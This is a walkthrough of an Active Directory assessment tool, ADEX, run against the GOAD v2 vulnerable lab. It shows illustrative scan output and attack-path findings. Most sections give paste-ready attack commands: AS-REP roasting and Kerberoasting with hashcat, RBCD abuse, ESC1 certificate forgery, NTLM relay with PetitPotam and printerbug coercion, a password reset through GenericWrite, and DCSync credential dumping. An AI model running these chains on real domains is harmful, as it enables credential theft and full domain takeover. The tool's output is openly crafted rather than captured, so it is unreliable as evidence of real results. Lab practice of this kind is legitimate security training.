# ADEX vs. GOAD v2 — End-to-end walkthrough

This is a worked example of running ADEX against [GOAD v2](https://github.com/Orange-Cyberdefense/GOAD), the multi-domain Active Directory lab built by Orange Cyberdefense / Mayfly. GOAD ships intentionally vulnerable so you can practise the full kill chain in a sandbox.

> **All output below is illustrative.** It was crafted to match GOAD v2's documented default state (default users, vulnerable templates, RBCD edges, etc.). Your actual run will vary depending on your GOAD revision, any user customisations, patch level, and which domain you bind to first. Always treat the recipes as commands to *review* before pasting into a shell.

---

## Lab in 30 seconds

GOAD v2 deploys three Windows Server VMs implementing two AD forests with a parent/child + a forest trust:

| FQDN | IP (default) | Role |
|---|---|---|
| `kingslanding.sevenkingdoms.local` | 192.168.56.10 | Parent DC, forest root `sevenkingdoms.local` |
| `winterfell.north.sevenkingdoms.local` | 192.168.56.11 | Child DC, `north.sevenkingdoms.local` |
| `castelblack.north.sevenkingdoms.local` | 192.168.56.22 | Member server (north) |
| `meereen.essos.local` | 192.168.56.12 | DC, separate forest `essos.local` |
| `braavos.essos.local` | 192.168.56.23 | Member server (essos) |

Trusts: `sevenkingdoms ↔ north` (parent/child, transitive), `north ↔ essos` (external).

Default lab credentials we'll start with: `vagrant:vagrant` (low-priv member of `Domain Users` on `north`).

---

## 1. One-shot recon

```bash
adex enum \
  -d north.sevenkingdoms.local \
  -u vagrant -p vagrant \
  --dc 192.168.56.11 \
  --map-trusts \
  -o goad-baseline -f all
```

Illustrative console summary:

```
bound to 192.168.56.11 as vagrant (password) base=DC=north,DC=sevenkingdoms,DC=local
[domain] running...
  6 finding(s)
[creds] running...
  9 finding(s)
[rights] running...
  3 finding(s)
[delegation] running...
  4 finding(s)
[adcs] running...
  2 finding(s)
traversing 2 trust(s)
[sevenkingdoms.local] [domain] running...
  4 finding(s)
[sevenkingdoms.local] [creds] running...
  3 finding(s)
[essos.local] [domain] running...
  4 finding(s)
[essos.local] [creds] running...
  2 finding(s)
[chain] 4 attack path(s) found

Summary: 5 CRITICAL  9 HIGH  6 MEDIUM  3 LOW  12 INFO

  ┏━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
  ┃ Severity ┃ Module     ┃ Title                                          ┃ Target                          ┃
  ┡━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
  │ CRITICAL │ chain      │ Path to Domain Admins (3 hops)                 │ Domain Admins                   │
  │ CRITICAL │ chain      │ Path to Enterprise Admins (4 hops)             │ Enterprise Admins               │
  │ CRITICAL │ adcs       │ ESC1 vulnerable template: ESC1-Template        │ ESC1-Template                   │
  │ CRITICAL │ delegation │ RBCD attack possible against winterfell$       │ winterfell.north.sevenkingdoms… │
  │ CRITICAL │ creds      │ Kerberoastable user: samwell.tarly             │ samwell.tarly                   │
  │ HIGH     │ creds      │ AS-REP roastable user: khal.drogo              │ khal.drogo                      │
  │ HIGH     │ delegation │ Unconstrained delegation: castelblack$         │ castelblack.north.sevenkingdo…  │
  │ HIGH     │ domain     │ SMB signing not required                       │ 192.168.56.11                   │
  │ HIGH     │ domain     │ LDAP signing not enforced on port 389          │ 192.168.56.11                   │
  │ HIGH     │ adcs       │ ESC8: AD CS HTTP enrollment exposed at http... │ ESSOS-CA                        │
  │ MEDIUM   │ risk       │ Top 10 highest-risk principals                 │                                 │
  │ MEDIUM   │ domain     │ MachineAccountQuota is 10                      │ DC=north,DC=sevenkingdoms,DC=…  │
  └──────────┴────────────┴────────────────────────────────────────────────┴─────────────────────────────────┘

wrote goad-baseline.json
wrote goad-baseline.html
wrote goad-baseline.txt
```

That's the differentiator in a screen: a `chain` row at the top tells you a 3-hop path to DA exists *before* you click into any of the underlying findings.

---

## 2. The chain finding (the headline)

Expanded entry from `goad-baseline.html`:

```
[CRITICAL] (chain) Path to Domain Admins (3 hops)

  ME --[ASREPRoast]--> khal.drogo --[GenericWrite]--> samwell.tarly
     --[AddMember]--> Domain Admins

  ADEX inferred a privilege-escalation chain from your current principal
  to a high-value target by stitching together edges emitted by the enum
  modules.

  Recipe — paste-ready:
    # Step: ASREPRoast on khal.drogo
    # See the matching 'AS-REP roastable' finding for the full command.
    # Step: GenericWrite on samwell.tarly
    # See the matching ACL finding for the bloodyAD/certipy command.
    # Step: AddMember on Domain Admins
    # See the matching ACL finding.
```

The per-edge findings (each with their own complete recipe) are listed below.

---

## 3. The supporting findings (each with its recipe)

### 3.1 `creds` — AS-REP roastable: `khal.drogo`

```
[HIGH] (creds) AS-REP roastable user: khal.drogo
  target: CN=khal.drogo,CN=Users,DC=north,DC=sevenkingdoms,DC=local
  desc:   User has Kerberos pre-authentication disabled
          (UF_DONT_REQUIRE_PREAUTH). Any host can request the AS-REP
          and crack it offline.

  Recipe — paste-ready:
    # Pre-auth is disabled — request the AS-REP and dump as hashcat hash
    impacket-GetNPUsers north.sevenkingdoms.local/khal.drogo -no-pass \
        -dc-ip 192.168.56.11 -format hashcat -outputfile asrep.hash
    # Crack offline (hashcat mode 18200 = Kerberos 5 AS-REP etype 23)
    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### 3.2 `creds` — Kerberoastable: `samwell.tarly`

```
[CRITICAL] (creds) Kerberoastable user: samwell.tarly
  target: CN=samwell.tarly,...
  evidence: spns: ['MSSQLSvc/winterfell.north.sevenkingdoms.local:1433']
            memberOf: ['CN=Domain Admins,...']  ← the reason this is CRITICAL

  Recipe — paste-ready:
    impacket-GetUserSPNs north.sevenkingdoms.local/khal.drogo:'<cracked>' \
        -dc-ip 192.168.56.11 -request-user samwell.tarly \
        -outputfile kerberoast.hash
    hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

### 3.3 `delegation` — RBCD attack possible against `winterfell$`

```
[CRITICAL] (delegation) RBCD attack possible against winterfell$
  desc: Current principal has dangerous write rights on the target
        computer object — write msDS-AllowedToActOnBehalfOfOtherIdentity
        and S4U your way to local admin/SYSTEM on the target.

  Recipe — paste-ready:
    # 1. Add a controlled computer (needs MAQ > 0):
    impacket-addcomputer -computer-name 'ADEX-PWN$' -computer-pass 'Pwn3d!' \
        north.sevenkingdoms.local/vagrant:'vagrant' -dc-ip 192.168.56.11
    # 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target:
    bloodyAD -d north.sevenkingdoms.local -u vagrant -p 'vagrant' \
        --dc-ip 192.168.56.11 add rbcd 'winterfell$' 'ADEX-PWN$'
    # 3. Request a TGS as Administrator via S4U:
    impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
        -impersonate Administrator -dc-ip 192.168.56.11 \
        north.sevenkingdoms.local/ADEX-PWN\$:'Pwn3d!'
    # 4. Use it:
    export KRB5CCNAME=Administrator.ccache
    impacket-secretsdump -k -no-pass winterfell.north.sevenkingdoms.local
```

### 3.4 `adcs` — ESC1 vulnerable template

```
[CRITICAL] (adcs) ESC1 vulnerable template: ESC1-Template
  evidence: ca: ESSOS-CA
            msPKI-Certificate-Name-Flag: 0x1   ← enrollee supplies subject
            msPKI-Enrollment-Flag:        0x0
            ekus: ['1.3.6.1.5.5.7.3.2']        ← Client Authentication

  Recipe — paste-ready:
    # ESC1: enroll a cert as administrator@north.sevenkingdoms.local
    certipy req -u vagrant@north.sevenkingdoms.local -p 'vagrant' \
        -dc-ip 192.168.56.11 -ca 'ESSOS-CA' -template 'ESC1-Template' \
        -upn 'administrator@north.sevenkingdoms.local'
    certipy auth -pfx administrator.pfx -dc-ip 192.168.56.11
    impacket-secretsdump -k -no-pass administrator@192.168.56.11
```

### 3.5 `delegation` — Unconstrained delegation: `castelblack$`

```
[HIGH] (delegation) Unconstrained delegation: castelblack$
  evidence: userAccountControl: 0x80000 (TRUSTED_FOR_DELEGATION)

  Recipe — paste-ready:
    # 1. Have admin/system on the unconstrained host (prerequisite).
    # 2. From there, run rubeus monitor for incoming TGTs:
    Rubeus.exe monitor /interval:5 /nowrap
    # 3. Coerce a target DC to authenticate to the unconstrained host:
    printerbug.py north.sevenkingdoms.local/vagrant:vagrant@192.168.56.11 \
        castelblack.north.sevenkingdoms.local
    # 4. Extract & reuse the captured TGT.
```

### 3.6 `adcs` — ESC8: HTTP enrollment exposed

```
[HIGH] (adcs) ESC8: AD CS HTTP enrollment exposed at http://essos.essos.local/certsrv/
  evidence: wwwAuthenticate: Negotiate, NTLM

  Recipe — paste-ready:
    impacket-ntlmrelayx -t http://essos.essos.local/certsrv/certfnsh.asp \
        --adcs --template DomainController -smb2support
    PetitPotam.py -u '' -p '' \
        $(ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1) \
        essos.essos.local
    certipy auth -pfx essos\$.pfx -dc-ip essos.essos.local
```

---

## 4. Cross-domain via `--map-trusts`

With `--map-trusts`, ADEX re-binds with the same creds against `sevenkingdoms.local` and `essos.local` and re-runs the modules. Findings get a `domain_context` tag; in the HTML report these show as a coloured pill next to the title.

Illustrative cross-domain finding:

```
[HIGH] (essos.local) (creds) AS-REP roastable user: braavos.scribe
  target: CN=braavos.scribe,CN=Users,DC=essos,DC=local

  Recipe — paste-ready:
    impacket-GetNPUsers essos.local/braavos.scribe -no-pass \
        -dc-ip 192.168.56.12 -format hashcat -outputfile asrep_essos.hash
    hashcat -m 18200 asrep_essos.hash /usr/share/wordlists/rockyou.txt
```

The chain analyzer sees both forests in the same graph, so a path that crosses the trust shows up in the same `chain` view at the top of the report.

---

## 5. Scenario planning with `adex chain`

Once you have a JSON snapshot you can re-ask "what's my path from here to X" without re-binding to LDAP:

```bash
adex chain --input goad-baseline.json --target "Enterprise Admins" --top-k 3
```

```
[CRITICAL] (chain) Path to Enterprise Admins (4 hops)

  ME --[ASREPRoast]--> khal.drogo --[GenericWrite]--> samwell.tarly
     --[AddMember]--> Domain Admins --[GenericAll]--> AdminSDHolder

Summary: 1 CRITICAL  0 HIGH  0 MEDIUM  0 LOW  0 INFO
```

---

## 6. Reproducing the chain

```bash
# 1. AS-REP roast khal.drogo (no creds even needed for this step)
impacket-GetNPUsers north.sevenkingdoms.local/khal.drogo -no-pass \
    -dc-ip 192.168.56.11 -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# → khal.drogo:horse

# 2. As khal.drogo, abuse GenericWrite on samwell.tarly
bloodyAD -d north.sevenkingdoms.local -u khal.drogo -p horse \
    --dc-ip 192.168.56.11 set password 'samwell.tarly' 'Pwn3d!Pwn3d!'

# 3. As samwell.tarly, you're DA. Confirm with DCSync:
impacket-secretsdump north.sevenkingdoms.local/samwell.tarly:'Pwn3d!Pwn3d!' \
    -dc-ip 192.168.56.11 -just-dc
```

---

## 7. Save a baseline, diff later

After remediation, re-run with the same flags pointing at a new output basename, then diff:

```bash
adex enum -d north.sevenkingdoms.local -u vagrant -p vagrant \
  --dc 192.168.56.11 --map-trusts -o goad-after -f all

adex report diff --baseline goad-baseline.json --current goad-after.json \
  --output goad-delta -f all
```

The delta files highlight new vs. resolved findings — useful for re-tests and for evidence in the report.

---

## Disclaimer

ADEX is an authorised-use security tool. Run it only against environments you own or have written permission to test. The output here is **illustrative** and was crafted to match GOAD v2's known-vulnerable configuration; do not assume your live results will mirror it line-for-line.

GOAD v2 itself is the work of [Mayfly](https://github.com/M4yFly) at Orange Cyberdefense — please support upstream if it's useful to you.
